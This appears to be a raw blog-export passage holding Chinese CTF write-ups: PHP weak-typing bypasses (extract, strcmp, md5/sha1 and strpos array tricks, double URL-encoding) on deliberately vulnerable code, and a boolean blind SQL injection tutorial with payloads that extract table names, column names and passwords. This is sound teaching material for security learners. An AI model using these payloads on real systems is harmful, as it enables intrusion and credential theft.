password.</span><br><span class=\"line\"></span><br><span class=\"line\">&#39;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else</span><br><span class=\"line\">echo &#39;</span><br><span class=\"line\">Login first!</span><br><span class=\"line\"></span><br><span class=\"line\">&#39;;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>这sha1函数加密，绕过方式和MD5一样，这里就不详讲了。<br>sha1()函数无法处理数组类型，将报错并返回false。<br><img src=\"https://img-blog.csdnimg.cn/20200503194311608.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>flag奉上！</p>\n<p><strong>0×06.数组返回NULL绕过</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$flag &#x3D; &quot;flag&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">if (isset ($_GET[&#39;password&#39;])) &#123;</span><br><span class=\"line\">if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) &#x3D;&#x3D;&#x3D; FALSE)</span><br><span class=\"line\">echo &#39;You password must be alphanumeric&#39;;</span><br><span class=\"line\">else if (strpos ($_GET[&#39;password&#39;], &#39;--&#39;) !&#x3D;&#x3D; FALSE)</span><br><span class=\"line\">die(&#39;Flag: &#39; . $flag);</span><br><span class=\"line\">else</span><br><span class=\"line\">echo &#39;Invalid password&#39;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) &#x3D;&#x3D;&#x3D; FALSE)</span><br></pre></td></tr></table></figure>\n<p>ereg函数会对你传入的password从a-z,A-Z,0-9 进行匹配，将你的密码限制在这三种字符中。</p>\n<p>ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。<br>ereg()限制password的格式，只能是数字或者字母。但ereg()函数存在NULL截断漏洞，可以使用%00绕过验证。<br>这里ereg有两个漏洞：</p>\n<pre><code>①%00截断及遇到%00则默认为字符串的结束\n②当ntf为数组时它的返回值不是FALSE</code></pre><p>​<br>这个漏洞没有使用到。</p>\n<p>strpos — 查找字符串首次出现的位置<br>作用：主要是用来查找字符在字符串中首次出现的位置。</p>\n<p>　strpos()如果传入数组，会返回NULL（和MD5，sha1类似无法处理数组，返回值为NULL）<br>思路就出来了：<br><img src=\"https://img-blog.csdnimg.cn/20200503200448591.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<p>嘿嘿嘿，flag到手。</p>\n<p><strong>0×07.弱类型整数大小比较绕过</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$temp &#x3D; $_GET[&#39;password&#39;];</span><br><span class=\"line\">is_numeric($temp)?die(&quot;no numeric&quot;):NULL;</span><br><span class=\"line\">if($temp&gt;1336)&#123;</span><br><span class=\"line\">echo $flag;</span><br></pre></td></tr></table></figure>\n<p>简单明了</p>\n<p>is_numeric() 函数用于检测变量是否为数字或数字字符串。<br>我们传入的值会被is_numeric函数进行检测，如果为数字就直接输出no numeric，所以我们要后者使其返回为NULL，并且大于1366.</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20200503201458938.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>这就结束了？ 对的</p>\n<p>未完待续……</p>\n","site":{"data":{}},"excerpt":"","more":"<p>﻿前言：学长带着我们学习了一些PHP弱类型，现在总结记一下。<br>  <em>目录：<br>    0×01.extract函数变量覆盖<br>    0×02.strcmp函数数组漏洞<br>    0×03.urldecode二次密码绕过<br>    0×04.md5函数加密<br>    0×05.sha()函数比较绕过<br>    0×06.数组返回NULL绕过<br>    0×07.弱类型整数大小比较绕过</em></p>\n<p>以下题目来源BugkuCTF</p>\n<p><strong>0×01.extract函数变量覆盖</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$flag&#x3D;&#39;xxx&#39;;</span><br><span class=\"line\">extract($_GET);</span><br><span class=\"line\">if(isset($shiyan))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">$content&#x3D;trim(file_get_contents($flag));</span><br><span class=\"line\">if($shiyan&#x3D;&#x3D;$content)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">echo&#39;flag&#123;xxx&#125;&#39;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">echo&#39;Oh.no&#39;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>里面有很多函数是我没见过的，先了解一下。</p>\n<p>extract() 函数从数组中将变量导入到当前的符号表。<br>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。<br>漏洞：<img src=\"https://img-blog.csdnimg.cn/20200503114734560.png\" alt=\"在这里插入图片描述\"></p>\n<p>isset() 函数用于检测变量是否已设置并且非 NULL。<br>如果已经使用 unset() 释放了一个变量之后，再通过 isset() 判断将返回 FALSE。<br>若使用 isset() 测试一个被设置成 NULL 的变量，将返回 FALSE。<br>同时要注意的是 null 字符（”\\0”）并不等同于 PHP 的 NULL 常量。</p>\n<p>trim() 函数移除字符串两侧的空白字符或其他预定义字符。</p>\n<p>file_get_contents() 函数把整个文件读入一个字符串中。<br>漏洞：当()里是变量的话，会返回为空值。</p>\n<p>运算符的了解：<img src=\"https://img-blog.csdnimg.cn/20200503115023141.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>首先，我们传入的函数经过extract函数处理，if语句判断是否存在shiyan变量，file_get_contents() 处理的是flag会返回空值，即content=空值。要想拿到flag，我们就需要让shiyan也为空值，但这并不能看到变量的覆盖。<br>我们传入的shiyan= ,即将原来的shiyan的覆盖为空值，同时我们传入flag= ，覆盖原来flag的值为空，就可以拿到flag了，这题有点小毛病。<img src=\"https://img-blog.csdnimg.cn/20200503120417592.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br><strong>0×02.strcmp函数数组漏洞</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$flag &#x3D; &quot;flag&#123;xxxxx&#125;&quot;;</span><br><span class=\"line\">if (isset($_GET[&#39;a&#39;])) &#123;</span><br><span class=\"line\">if (strcmp($_GET[&#39;a&#39;], $flag) &#x3D;&#x3D; 0) &#x2F;&#x2F;如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。</span><br><span class=\"line\">&#x2F;&#x2F;比较两个字符串（区分大小写）</span><br><span class=\"line\">die(&#39;Flag: &#39;.$flag);</span><br><span class=\"line\">else</span><br><span class=\"line\">print &#39;No&#39;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>看到不懂的函数就去问度娘</p>\n<p>die() 函数输出一条消息，并退出当前脚本。</p>\n<p>int strcmp ( string $str1 , string $str2 )<br>参数 str1第一个字符串。str2第二个字符串。<br>如果 str1 小于 str2 返回 &lt; 0；<br>如果 str1 大于 str2 返回 &gt; 0；<br>如果两者相等，返回 0。</p>\n<p>我们要想拿到flag，就需要str1=str2,但是flag的长度我们也不知道，这个时候我们就不能走寻常路了：</p>\n<p>在这里strcmp函数有漏洞只需将get传入进来的变为数组就行了。<br>注：这一个漏洞适用与5.3之前版本的php。<br><img src=\"https://img-blog.csdnimg.cn/20200503121949137.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>flag到手。</p>\n<p>   <strong>0×03.urldecode二次密码绕过</strong><br>   代码奉上：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">   &lt;?php</span><br><span class=\"line\">if(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123;</span><br><span class=\"line\">echo(&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">not allowed!</span><br><span class=\"line\"></span><br><span class=\"line\">&quot;);</span><br><span class=\"line\">exit();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$_GET[id] &#x3D; urldecode($_GET[id]);</span><br><span class=\"line\">if($_GET[id] &#x3D;&#x3D; &quot;hackerDJ&quot;)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">echo &quot;</span><br><span class=\"line\">Access granted!</span><br><span class=\"line\"></span><br><span class=\"line\">&quot;;</span><br><span class=\"line\">echo &quot;</span><br><span class=\"line\">flag</span><br><span class=\"line\"></span><br><span class=\"line\">&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>eregi()函数在由模式指定的字符串中搜索指定的字符串，搜索不区分大小写。<br>exit() 函数输出一条消息，并退出当前脚本。</p>\n<p>我们传入的id会被eregi函数与hackerDJ比较，相同的话直接就GG了。<br>所以我往下面看，我们传入的id经过一次url解码等于hackerDJ的话就可以拿到flag，但是浏览器还会给我们解码一次，这就意味着我们需要给hackerDJ编码两次，就能拿到flag。<br><img src=\"https://img-blog.csdnimg.cn/20200503125011628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<p>0×04.md5函数加密</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">$flag &#x3D; &#39;flag&#123;test&#125;&#39;;</span><br><span class=\"line\">if (isset($_GET[&#39;username&#39;]) and isset($_GET[&#39;password&#39;])) &#123;</span><br><span class=\"line\">if ($_GET[&#39;username&#39;] &#x3D;&#x3D; $_GET[&#39;password&#39;])</span><br><span class=\"line\">print &#39;Your password can not be your username.&#39;;</span><br><span class=\"line\">else if (md5($_GET[&#39;username&#39;]) &#x3D;&#x3D;&#x3D; md5($_GET[&#39;password&#39;]))</span><br><span class=\"line\">die(&#39;Flag: &#39;.$flag);</span><br><span class=\"line\">else</span><br><span class=\"line\">print &#39;Invalid password&#39;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>我们要知道md5函数加密在低版本中是无法处理数组的(但是md5处理数组时会返回空值)。<br>那么突破口就来了，但是：<br><img src=\"https://img-blog.csdnimg.cn/20200503192133325.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>两个返回的都是null，自然是相同的，但是代码中又要求我们不相同。<br>emmmmmmm,思考一下。</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20200503192433451.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>这样值就不一样了，flag到手！</p>\n<p><strong>0×05.sha()函数比较绕过</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$flag &#x3D; &quot;flag&quot;;</span><br><span class=\"line\">if (isset($_GET[&#39;name&#39;]) and isset($_GET[&#39;password&#39;]))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">var_dump($_GET[&#39;name&#39;]);</span><br><span class=\"line\">echo &quot;</span><br><span class=\"line\">&quot;;</span><br><span class=\"line\">var_dump($_GET[&#39;password&#39;]);</span><br><span class=\"line\">var_dump(sha1($_GET[&#39;name&#39;]));</span><br><span class=\"line\">var_dump(sha1($_GET[&#39;password&#39;]));</span><br><span class=\"line\">if ($_GET[&#39;name&#39;] &#x3D;&#x3D; $_GET[&#39;password&#39;])</span><br><span class=\"line\">echo &#39;</span><br><span class=\"line\"></span><br><span class=\"line\">Your password can not be your name!</span><br><span class=\"line\"></span><br><span class=\"line\">&#39;;</span><br><span class=\"line\">else if (sha1($_GET[&#39;name&#39;]) &#x3D;&#x3D;&#x3D; sha1($_GET[&#39;password&#39;]))</span><br><span class=\"line\">die(&#39;Flag: &#39;.$flag);</span><br><span class=\"line\">else</span><br><span class=\"line\">echo &#39;</span><br><span class=\"line\">Invalid password.</span><br><span class=\"line\"></span><br><span class=\"line\">&#39;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else</span><br><span class=\"line\">echo &#39;</span><br><span class=\"line\">Login first!</span><br><span class=\"line\"></span><br><span class=\"line\">&#39;;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>这sha1函数加密，绕过方式和MD5一样，这里就不详讲了。<br>sha1()函数无法处理数组类型，将报错并返回false。<br><img src=\"https://img-blog.csdnimg.cn/20200503194311608.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>flag奉上！</p>\n<p><strong>0×06.数组返回NULL绕过</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$flag &#x3D; &quot;flag&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">if (isset ($_GET[&#39;password&#39;])) &#123;</span><br><span class=\"line\">if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) &#x3D;&#x3D;&#x3D; FALSE)</span><br><span class=\"line\">echo &#39;You password must be alphanumeric&#39;;</span><br><span class=\"line\">else if (strpos ($_GET[&#39;password&#39;], &#39;--&#39;) !&#x3D;&#x3D; FALSE)</span><br><span class=\"line\">die(&#39;Flag: &#39; . $flag);</span><br><span class=\"line\">else</span><br><span class=\"line\">echo &#39;Invalid password&#39;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) &#x3D;&#x3D;&#x3D; FALSE)</span><br></pre></td></tr></table></figure>\n<p>ereg函数会对你传入的password从a-z,A-Z,0-9 进行匹配，将你的密码限制在这三种字符中。</p>\n<p>ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。<br>ereg()限制password的格式，只能是数字或者字母。但ereg()函数存在NULL截断漏洞，可以使用%00绕过验证。<br>这里ereg有两个漏洞：</p>\n<pre><code>①%00截断及遇到%00则默认为字符串的结束\n②当ntf为数组时它的返回值不是FALSE</code></pre><p>​<br>这个漏洞没有使用到。</p>\n<p>strpos — 查找字符串首次出现的位置<br>作用：主要是用来查找字符在字符串中首次出现的位置。</p>\n<p>　strpos()如果传入数组，会返回NULL（和MD5，sha1类似无法处理数组，返回值为NULL）<br>思路就出来了：<br><img src=\"https://img-blog.csdnimg.cn/20200503200448591.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<p>嘿嘿嘿，flag到手。</p>\n<p><strong>0×07.弱类型整数大小比较绕过</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$temp &#x3D; $_GET[&#39;password&#39;];</span><br><span class=\"line\">is_numeric($temp)?die(&quot;no numeric&quot;):NULL;</span><br><span class=\"line\">if($temp&gt;1336)&#123;</span><br><span class=\"line\">echo $flag;</span><br></pre></td></tr></table></figure>\n<p>简单明了</p>\n<p>is_numeric() 函数用于检测变量是否为数字或数字字符串。<br>我们传入的值会被is_numeric函数进行检测，如果为数字就直接输出no numeric，所以我们要后者使其返回为NULL，并且大于1366.</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20200503201458938.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>这就结束了？ 对的</p>\n<p>未完待续……</p>\n"},{"title":"SQL注入--布尔盲注","date":"2020-03-05T07:04:05.000Z","photos":["http://pic.netbian.com/uploads/allimg/180413/121552-152359295246db.jpg"],"_content":"\n\n\n前不久又学习了sql注入的布尔盲注，现在总结一下。\n**布尔盲注的前提：没有显示位，没有sql语句执行错误的信息（和联合查询就不同了）。只能通过页面返回正常不正常来判断是否存在注入。**\n\n### 1.当然第一步还是判断闭合符号，这是基础。这都搞不了，下面就无法进行了。\n### 2.第二部就是判断数据库的长度。\n  我们需要知道这一函数   **1' and (length(database())=8)--+**，通过它来判断数据库的长度，当然=可以换成 >,<  ,但是无论怎么换我们都是要缩小数据库长度的范围，最终确定数据库的长度。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200305204807114.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200305204830900.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n上面输入8，页面返回正常；然而输入9就出现异常。从而就可以判断出数据库名称的长度为8。\n### 3.判断数据库名。\n我们要使用     **1' and (ascii(substr(database(),1,1))>97)--+**，来一一判断数据库的ascii值。最终得到数据库的名称。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200305210117120.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020030521012519.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n在上面输入114发现页面正常，115却页面不正常，从而判断出数据库第一个的开头的ascii值为115，也就是s。\n我们需要了解相关的函数：\n**length()返回字符串的长度\nsubstr()截取字符串的字符\n    database()，返回当前数据库名\n    第一个1，表示截取字符串的起始位置。\u000b    第二个1，表示截取字符串长度\u000b    语句作用：判断第一个库第一个字符是什么\nascii()将字符串转换成其ASCII码**\n把第一个1换成2，就会出现第二个字符的值。以此轮回，最终就会确定数据库的名称。\n### 4.爆出表名。\n\n```\n?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))>1 --+\n```\n同样也是通过ascii来一一判断出表名。通过修改 limit 0,1 来获取其他表名。\n### 5.曝出列名。\n\n```\n?id=1' and (ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1)))>1 --+\n```\n也是修改limit后面的值来爆出列名。\n### 6.爆值。\n\n```\n?id=1' and (ascii(substr(( select password from users limit 0,1),1,1)))>1--+  \n```\n同上。\n这个过程是非常漫长的。我们也有其他的方法进行盲注。用python脚本，和burp更加简单。\n大佬博客[burp进行盲注](https://www.cnblogs.com/hackxf/p/8893245.html)\n[布尔盲注](https://blog.csdn.net/weixin_40709439)\n小白持续更新中！！！\n\n","source":"_posts/SQL注入——布尔盲注.md","raw":"---\ntitle: SQL注入--布尔盲注\ndate: 2020-03-05 15:04:05\ntags: SQL注入\ncategories: 技术\nphotos: http://pic.netbian.com/uploads/allimg/180413/121552-152359295246db.jpg\n---\n\n\n\n前不久又学习了sql注入的布尔盲注，现在总结一下。\n**布尔盲注的前提：没有显示位，没有sql语句执行错误的信息（和联合查询就不同了）。只能通过页面返回正常不正常来判断是否存在注入。**\n\n### 1.当然第一步还是判断闭合符号，这是基础。这都搞不了，下面就无法进行了。\n### 2.第二部就是判断数据库的长度。\n  我们需要知道这一函数   **1' and (length(database())=8)--+**，通过它来判断数据库的长度，当然=可以换成 >,<  ,但是无论怎么换我们都是要缩小数据库长度的范围，最终确定数据库的长度。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200305204807114.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200305204830900.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n上面输入8，页面返回正常；然而输入9就出现异常。从而就可以判断出数据库名称的长度为8。\n### 3.判断数据库名。\n我们要使用     **1' and (ascii(substr(database(),1,1))>97)--+**，来一一判断数据库的ascii值。最终得到数据库的名称。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200305210117120.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020030521012519.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n在上面输入114发现页面正常，115却页面不正常，从而判断出数据库第一个的开头的ascii值为115，也就是s。\n我们需要了解相关的函数：\n**length()返回字符串的长度\nsubstr()截取字符串的字符\n    database()，返回当前数据库名\n    第一个1，表示截取字符串的起始位置。\u000b    第二个1，表示截取字符串长度\u000b    语句作用：判断第一个库第一个字符是什么\nascii()将字符串转换成其ASCII码**\n把第一个1换成2，就会出现第二个字符的值。以此轮回，最终就会确定数据库的名称。\n### 4.爆出表名。\n\n```\n?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))>1 --+\n```\n同样也是通过ascii来一一判断出表名。通过修改 limit 0,1 来获取其他表名。\n### 5.曝出列名。\n\n```\n?id=1' and (ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1)))>1 --+\n```\n也是修改limit后面的值来爆出列名。\n### 6.爆值。\n\n```\n?id=1' and (ascii(substr(( select password from users limit 0,1),1,1)))>1--+  \n```\n同上。\n这个过程是非常漫长的。我们也有其他的方法进行盲注。用python脚本，和burp更加简单。\n大佬博客[burp进行盲注](https://www.cnblogs.com/hackxf/p/8893245.html)\n[布尔盲注](https://blog.csdn.net/weixin_40709439)\n小白持续更新中！！！\n\n","slug":"SQL注入——布尔盲注","published":1,"updated":"2020-05-11T09:17:23.115Z","comments":1,"layout":"post","link":"","_id":"ckchhpsgu000c9kq61act0nl2","content":"<p>前不久又学习了sql注入的布尔盲注，现在总结一下。<br><strong>布尔盲注的前提：没有显示位，没有sql语句执行错误的信息（和联合查询就不同了）。只能通过页面返回正常不正常来判断是否存在注入。</strong></p>\n<h3 id=\"1-当然第一步还是判断闭合符号，这是基础。这都搞不了，下面就无法进行了。\"><a href=\"#1-当然第一步还是判断闭合符号，这是基础。这都搞不了，下面就无法进行了。\" class=\"headerlink\" title=\"1.当然第一步还是判断闭合符号，这是基础。这都搞不了，下面就无法进行了。\"></a>1.当然第一步还是判断闭合符号，这是基础。这都搞不了，下面就无法进行了。</h3><h3 id=\"2-第二部就是判断数据库的长度。\"><a href=\"#2-第二部就是判断数据库的长度。\" class=\"headerlink\" title=\"2.第二部就是判断数据库的长度。\"></a>2.第二部就是判断数据库的长度。</h3><p>  我们需要知道这一函数   <strong>1’ and (length(database())=8)–+</strong>，通过它来判断数据库的长度，当然=可以换成 &gt;,&lt;  